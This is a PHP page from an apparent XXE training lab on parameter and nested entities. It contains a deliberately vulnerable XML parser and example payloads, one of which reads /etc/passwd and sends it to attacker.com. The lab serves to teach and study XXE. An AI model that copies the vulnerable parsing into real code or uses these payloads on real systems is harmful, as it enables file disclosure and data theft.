<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 5 - Advanced XXE</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab explores advanced XXE techniques including parameter entities and nested entity 
                    resolution. Parameter entities are entities that can only be used within DTDs and are 
                    referenced using % notation.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % param1 "World">
    <!ENTITY % param2 "Hello %param1;">
    <!ENTITY greeting "%param2;">
]>
<data>
    <message>&greeting;</message>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Vulnerable XML parsing - allows parameter and nested entities
                $internalErrors = libxml_use_internal_errors(true);
                $result = simplexml_load_string($xml);
                
                if ($result) {
                    echo '<div class="results">';
                    echo '<h3>✅ Parsing Results:</h3>';
                    echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '<h3>❌ Parsing Error:</h3>';
                    $errors = libxml_get_errors();
                    foreach ($errors as $error) {
                        echo '<pre>' . htmlspecialchars($error->message) . '</pre>';
                    }
                    echo '</div>';
                }
                
                libxml_use_internal_errors($internalErrors);
            }
            ?>

            <div class="examples">
                <h3>💡 Example Payloads:</h3>
                
                <h4>Parameter Entities:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % param1 "World">
    <!ENTITY % param2 "Hello %param1;">
    <!ENTITY greeting "%param2;">
]>
<data>
    <message>&greeting;</message>
</data>'); ?></pre>
                
                <h4>External Parameter Entities:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % ext SYSTEM "http://example.com/evil.dtd">
    %ext;
]>
<data>
    <content>&evil;</content>
</data>'); ?></pre>
                
                <h4>Nested External Entities:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % wrap "<!ENTITY exfil SYSTEM \'http://attacker.com/?data=%file;\'>">
    %wrap;
]>
<data>
    <message>&exfil;</message>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>Parameter entities start with % and are defined in DTD</li>
                    <li>They can be nested and referenced within the DTD</li>
                    <li>External parameter entities allow including external DTD content</li>
                    <li>Combine parameter entities for complex attacks</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
